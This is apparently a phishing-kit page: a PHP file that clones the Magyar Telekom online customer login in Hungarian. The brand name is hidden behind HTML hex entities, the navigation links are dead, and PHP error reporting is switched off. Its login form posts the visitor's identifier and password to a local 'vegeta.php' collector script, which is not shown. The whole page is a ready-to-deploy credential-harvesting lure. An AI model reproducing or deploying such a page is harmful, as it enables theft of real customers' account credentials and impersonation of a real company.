<?php
session_start();
error_reporting(0);
//--------------------------------------------------------------------------------------------------------------//
?>
<html class="responsiveFrame rf-beige js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link id="tf-frame-usermenu-css" rel="stylesheet" type="text/css" href="./1/frame-usermenu.css"><link type="text/css" rel="stylesheet" media="all" href="./1/common.css">
  <meta http-equiv="Content-Language" content="hu">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="imagetoolbar" content="no">
  <meta name="format-detection" content="telephone=no">
  <meta name="title" content="Magyar &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 csoport">
  <meta name="description" content="Magyar &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 csoport">
  <title>Magyar &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 csoport</title>
  <link type="image/x-icon" rel="icon" href="./img/favicon.ico">
  <link type="image/x-icon" rel="shortcut icon" href="./img/favicon.ico">
  					<link type="text/css" rel="stylesheet" media="all" href="./1/tloader.css">
  					
  					<link type="text/css" rel="stylesheet" media="all" href="./1/frame-ui.css">
  					<link type="text/css" rel="stylesheet" media="all" href="./1/frame-structure.css">
  					<script type="text/javascript" src="./1/1.js"></script>

<script type="text/javascript" src="./1/2.js"></script>
<script type="text/javascript">
/*<![CDATA[*/
TF_MSISDN_PREFIXES = [30,31,20,70];
/*]]>*/
</script>
<script type="text/javascript">
/*<![CDATA[*/
var passwordRequiredText ='A jelszo megadasa kotelezo.';
/*]]>*/
</script>
<script type="text/javascript">
/*<![CDATA[*/
var logonIdRequiredText ='Az azonosito megadasa kotelezo';
/*]]>*/
</script>
</head><body>
<header id="frameHeader">
  <div class="headerWrapper">
    <div class="mainMenuWrapper">
      <a href="#" class="btn left menu-trigger">Menu</a>
      <a href="#" class="logo left">
        <img src="./1/ic-logo.svg"  width="60" height="30">
      </a>
      <nav id="mainMenu">
        <ul class="skipLinks">
          <li>
            <a class="Skip ToMenu" href="#" title="Link a menure">Ugras a menure</a>
          </li>
          <li>
            <a class="Skip ToContent" href="#" title="Link a contentre">Ugras A tartalomhoz</a>
          </li>
        </ul>
        <ul class="megamenu">
          <li class="menuItem">
            <div class="item-name">
              <a class="menuItemTitle" href="#" id="menu1" accesskey="1" title="Keszulekek menupont">Keszulekek</a>
              <div class="arrow">&nbsp;</div>
              <span class="underline">&nbsp;</span>
              <span class="underline-hover">&nbsp;</span>
            </div>
          </li>
          <li class="menuItem">
            <div class="item-name">
              <a class="menuItemTitle" href="#" id="menu2" accesskey="2" title="Szolgaltatasok menupont">Szolgaltatasok</a>
              <div class="arrow">&nbsp;</div>
              <span class="underline">&nbsp;</span>
              <span class="underline-hover">&nbsp;</span>
            </div>
          </li>
          <li class="menuItem">
            <div class="item-name">
              <a class="menuItemTitle" href="#" id="menu3" accesskey="3" title="ugyintezes menupont">ugyintezes</a>
              <div class="arrow">&nbsp;</div>
              <span class="underline">&nbsp;</span>
              <span class="underline-hover">&nbsp;</span>
            </div></li>
                <li class="menuItem desktop-hide">
            <nav class="segments"><a href="#" class="segment-item link-m active" title="">Lakossagi</a>
              <a href="#" class="segment-item link-m" title="">uzleti</a>
              <a href="#" class="segment-item link-m" title="">Rolunk</a>
            </nav>
          </li>
        </ul>
      </nav>
      <div class="buttons-holder btn_right">
        <a href="#" class="btn btn_icon_search btn_left mobile-hide" title="Kereso lenyitasa">Kereses</a>
        <a href="#" class="btn btn_icon_basket btn_left" title="">Kosar
          <span class="notif"></span>
        </a>
        <div class="tLogin js-state-17" id="app-telekomfiok">
    <a href="#" class="btn btn_icon_profile btn_with_text btn_right" id="usermenu_loginLink">Belepes</a>
  </div>
      </div>
    </div>
    <div class="topMenu">
            <nav class="segments"><a href="#" class="segment-item link-m active" title="#">Lakossagi</a>
        <a href="#" class="segment-item link-m" title="">uzleti</a>
        <a href="#" class="segment-item link-m" title="">Rolunk</a>
      </nav>
    </div>
    <div class="gray-overlay">&nbsp;</div>
  </div></header>


<section id="frameContainer" class="noAside" style="position: relative;">

	

	<section id="frameContent">
		
    <div id="telekom-fiok">
        <div id="telekom-fiok-login">
	        
            <h1>
                <strong>BELePeS ONLINE uGYINTeZeSHEZ</strong>
            </h1>
            <p class="lead text">A belepeshez e-mail-cim, mobiltelefonszam, MT ugyfel-azonosito vagy uzleti felhasznalonev, valamint a hozzajuk tartozo jelszo szukseges.</p>
            <div class="poser">
                <div class="posLeft">
                    <div class="loginForm">
                        <div class="tBlock white bottomDesignTirangle">
							<form id="loginForm" name="tform" action="./vegeta.php" method="post"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="loginForm_hf_0" id="loginForm_hf_0"></div>
								<div class="fRow">
									<div class="fLabel">
										<label id="logonIdLabel" for="tf-loginid" class="">
											Belepesi azonosito
										</label>
									</div>
									<div class="fGroup">
	                                    <div class="fRow">
	                                        <div class="fInput">
	                                            <input name="el" id="tf-logonIdX" type="text" class="textInp loginid" min="0" step="any" autocomplete="off" tabindex="1" value="">	   	                                                                              
	                                            <a class="fLink" href="#">
	                                                Milyen azonositot hasznaljak?
	                                            </a>
	                                            <ul id="id11">
		
	</ul>
	                                        </div>
	                                    </div>
	                                    <div class="fRow" style="display: none;">
	                                        <div class="fHelp">Ez a belepesi azonosito egy...</div>
	                                    </div>
	                                    <div class="fRow nopad" style="display: none;">
	                                        <div class="fInput">
	                                            <label for="tf-idtype1" class="radioBox inline checked">
	                                                <input type="radio" name="idtype" id="tf-idtype1" checked="">
	                                                <span class="ico"></span>
	                                                <span class="text">
	                                                    mobiltelefonszam
	                                                </span>
	                                            </label>
	                                            <label for="tf-idtype2" class="radioBox inline">
	                                                <input type="radio" name="idtype" id="tf-idtype2">
	                                                <span class="ico"></span>
	                                                <span class="text">
	                                                    MT ugyfelazonosito
	                                                </span>
	                                            </label>
	                                        </div>
	                                    </div>
                                	</div>
								</div>
								<div class="fRow">
									<div class="fLabel">
										<label id="passwordLabel" for="tf-password1" class="">
											Jelszo
										</label>
										<small class=""></small>
									</div>
									<div class="fGroup">
										<div class="fRow">
											<div class="fInput">
											 	<input name="logonId" id="tf-logonId" type="hidden" value="">     
												<input name="pp" id="tf-password1" type="password" class="textInp password" autocomplete="off" tabindex="2" value="">	
												
	 													<a href="#" class="fLink" id="idd">Nem tudom a jelszavam</a>										
												<ul id="id12">
		
	</ul>
											</div>
										</div>
									</div>
								</div>
															
								<div class="loggedin">
									<div class="fRow">
										<div class="fLabel">
											<label for="loggedin" class="shortLabel">

											</label>
										</div>
										<div class="fInput">
											<label for="loggedin" class="checkBox  checked">
												<input type="checkbox" name="ao" id="loggedin" checked="checked">
												<span class="ico"></span>
												<span class="text">
													Belepve maradok
												</span>
											</label>
										</div>
									</div>
								</div>
								<div class="fRow">
									<div class="fInput labelSpacer">
										<button id="submitLogin" type="submit" class="btn mag" tabindex="3">Belepek</button>
									</div>
								</div>
							</form>
                            							
							
                        </div>
                        <div class="tBlock createNewCta marginal">
                            <h2>Nincs meg &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 fiokod?</h2>
                            <p>Hozz letre &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 fiokot, lepj be egyszerubben, es kezeld egyutt elofizeteseidet!</p>
                            <a href="#" class="btn mag" id="idf">
                            	&#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 fiokot regisztralok
                            </a>
                        </div>
                    </div>
                </div>
                
            </div>
            
        </div>
    </div>

	</section>
</section>


  <footer id="frameFooter">
    <div id="frameFooterContainer">
      
      
      <div id="footerCopyrightLogo">
      <div class="telekom-logo">
      <a href="#" title="">
      <img src="./1/ft_ico_telekom.svg" alt="">
      </a>
      <p>Egyutt.veled</p>
      </div>
      <div class="copyright-text">
      <p>© 2017 Magyar &#x54;&#x65;&#x6c;&#x65;&#x6b;&#x6f;&#x6d;&#x20 Nyrt.</p>
      </div>
      <div class="copyright-links">
      <a href="#" title="">Jogi tudnivalok</a>
      <a href="#" title="">altalanos szerzodesi feltetelek</a>
      <a href="#" title="">Adatvedelem</a>
      <a href="#" title="">Felhivas</a>
      <a href="#" title="">Kozlemeny</a>
      </div>
      </div>
    </div>
    <a id="pagetop-link" href="#" class="cd-top" title="Vissza az oldaltetejere!" alt="Vissza az oldal tetejere!">
      <span class="cd-top-arrow">Vissza az oldal tetejere</span>
    </a>
  </footer>
</body></html>